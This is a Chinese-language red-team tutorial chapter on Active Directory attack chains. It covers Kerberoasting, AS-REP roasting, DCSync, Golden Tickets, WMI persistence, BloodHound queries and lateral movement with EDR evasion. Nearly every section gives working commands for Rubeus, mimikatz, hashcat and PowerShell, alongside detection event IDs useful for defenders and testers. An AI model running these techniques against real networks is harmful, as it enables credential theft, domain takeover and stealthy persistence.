# 红队攻击技术深度

## 概述

红队的核心不是"找到一个漏洞"，而是"达成目标"——无论需要多少环节、多久时间。本章涵盖从枚举到域控的完整攻击链。

---

## 1. Active Directory 攻击

### 1.1 Kerberoasting

```bash
# Kerberoasting 攻击流程

# 1. 枚举 SPN (服务主体名称)
# Windows (PowerShell)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# 2. 请求 TGS 票据
# Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# 3. 离线破解
hashcat -m 13100 hashes.txt rockyou.txt --force

# 4. 横向移动
# 使用破解的票据
Rubeus.exe ptt /ticket:ticket.kirbi

# 检测:
# Event ID 4769 (Kerberos TGS 请求) - 加密类型 0x17 (RC4)
```

### 1.2 AS-REP Roasting

```bash
# AS-REP Roasting - 攻击不需要预认证的用户

# 1. 枚举不要求预认证的用户
Get-DomainUser -PreauthNotRequired

# 2. 获取 AS-REP (Rubeus)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# 3. 破解
hashcat -m 18200 asrep.txt rockyou.txt

# 防御: 所有用户启用 Kerberos 预认证
```

### 1.3 DCSync

```bash
# DCSync - 伪装成 DC 请求密码哈希

# Mimikatz
mimikatz# lsadump::dcsync /domain:corp.local /user:Administrator

# 输出:
# - NTLM Hash
# - Kerberos Keys
# - 解密凭证

# 前提条件:
# - Domain Admin 权限或
# - Replicating Directory Changes 权限

# 检测:
# Event ID 4662 (Directory Service Access)
# → Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (复制)
```

---

## 2. 持久化技术

### 2.1 Golden Ticket

```bash
# Golden Ticket - Kerberos 万能票据

# 前提: 获取 KRBTGT 哈希 (DCSync)

# 1. 获取 KRBTGT 哈希
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt

# 2. 创建 Golden Ticket
mimikatz# kerberos::golden \
    /domain:corp.local \
    /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    /krbtgt:krbtgt_hash \
    /user:Administrator \
    /id:500 \
    /groups:513,512,520,518,519 \
    /ticket:golden.kirbi

# 3. 导入票据
mimikatz# kerberos::ptt golden.kirbi

# 检测: Event ID 4769 中的异常票据生命周期
```

### 2.2 WMI 事件订阅

```powershell
# WMI 持久化 - 定时触发恶意代码

$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "SysUpdate"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "SysUpdateConsumer"
    CommandLineTemplate = "powershell.exe -enc BASE64..."
}

$Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

# 检测:
# Get-WmiObject -Namespace root\subscription -Class __EventFilter
# Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
```

---

## 3. BloodHound 攻击路径分析

```cypher
// BloodHound Cypher 查询

// 查找 Domain Admin 最短路径
MATCH p = shortestPath(
    (u:User {owned: true})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p

// 查找有 DCSync 权限的非 DA 账户
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.objectid ENDS WITH '-512'
    OR g.objectid ENDS WITH '-519'
    OR g.objectid ENDS WITH '-544'
RETURN u.name, g.name

// 查找可 Kerberoast 的高价值账户
MATCH (u:User {hasspn: true})
WHERE u.name STARTS WITH 'svc_' OR u.name CONTAINS 'admin'
RETURN u.name, u.serviceprincipalnames

// 查找约束委派攻击路径
MATCH (c:Computer {enabled: true})
WHERE c.unconstraineddelegation = true
RETURN c.name
```

### SharpHound 收集

```bash
# 使用 SharpHound 收集 AD 数据
SharpHound.exe --CollectionMethod All --Domain corp.local --ZipFileName bloodhound.zip

# 导入 BloodHound
# → 上传 bloodhound.zip
# → 运行分析查询
# → 标记 owned 节点
# → 绘制攻击路径
```

---

## 4. 横向移动技术

### 4.1 常用方法比较

```yaml
横向移动技术对比:

  PsExec:
    - 方法: SMB + 服务创建
    - 检测: Event ID 7045 + Sysmon 13
    - 规避: 改名、不使用 -accepteula

  WMI:
    - 方法: DCOM/WinRM
    - 检测: Event ID 4688 (wmic.exe 参数)
    - 规避: CIM Session

  WinRM:
    - 方法: HTTP/HTTPS (5985/5986)
    - 检测: Event ID 4648
    - 规避: SSL 加密 (5986)

  Pass-the-Hash:
    - 方法: NTLM 认证
    - 检测: Event ID 4624 (LogonType 3 + NTLM)
    - 规避: 使用 legitimate 工具 (PsExec 等)

  Overpass-the-Hash:
    - 方法: 用 NTLM Hash 请求 Kerberos TGT
    - 检测: Event ID 4768 (加密类型降级)
    - 规避: AES 密钥代替 NTLM
```

### 4.2 规避检测

```powershell
# 规避 EDR 的横向移动技术

# 1. DLL 侧加载
# 利用签名应用的 DLL 搜索顺序
copy evil.dll C:\Program Files\LegitApp\version.dll
C:\Program Files\LegitApp\legit.exe  # 加载你的 DLL

# 2. WMI 无文件执行
$cim = New-CimSession -ComputerName TARGET
Invoke-CimMethod -ClassName Win32_Process `
    -MethodName Create `
    -Arguments @{CommandLine="powershell -enc BASE64"} `
    -CimSession $cim

# 3. DCOM 横向移动 (MMC20.Application)
[activator]::CreateInstance(
    [type]::GetTypeFromProgID("MMC20.Application","TARGET")
).Document.ActiveView.ExecuteShellCommand(
    "powershell.exe", $null, "-enc BASE64", "7"
)
```

---

## 参考资源

- [MITRE ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Harmj0y's PowerShell Empire](https://github.com/BC-SECURITY/Empire)

---

*上一篇：[红队概述](index.md)*

*下一篇：[红队 OPSEC 与行动安全](02-red-team-opsec.md)*
